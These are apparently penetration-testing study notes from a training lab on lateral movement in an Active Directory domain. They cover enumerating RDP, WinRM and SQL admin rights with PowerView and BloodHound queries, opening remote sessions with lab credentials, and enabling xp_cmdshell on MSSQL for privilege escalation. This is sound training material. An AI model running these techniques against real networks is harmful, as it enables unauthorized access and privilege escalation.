## Moving around a Domain 
RDP
[Powershell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2)
	Windows Remote management
MSSQL Server. 

**Priviliges to look for **
- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

### RDP 
Sometimes you may not have admin rights but can RDP to another machine
#### using Powerview 
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
Be able to see what users can RDP to this host.
#### Bloodhound 
![[Pasted image 20230817151100.png]]
### WinRM
#### PowerView
```powershell
 Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
Remote Management Users was to enable WinRM without local admin access.

#### BloodHound
Custom cypher query
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
Add as a custom query
![[Pasted image 20230817151518.png]]

#### Establishing WinRm Sessions from Windows 
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force

$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```
#### From Linux
```shell
evil-winrm -i 10.129.201.234 -u forend
```

### SQL Server Admins
#### Bloodhound Custom Query 
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
#### Connecting the MSSQL
##### PowerUp SQL Windows
Hunt for SQL server Instances
```powershell
cd .\PowerUpSQL\

Import-Module .\PowerUpSQL.ps1
```

```powershell
Get-SQLInstanceDomain
```
Authenticate against MSQQL Services 
```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

##### MSSQL Client Linux
```shell
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
#### SeImpersonate 
```shell
enable_xp_cmdshell
```
JuciyPotato, PrintSpoofer, RoguePotato etc.
```shell
xp_cmdshell whoami /priv
```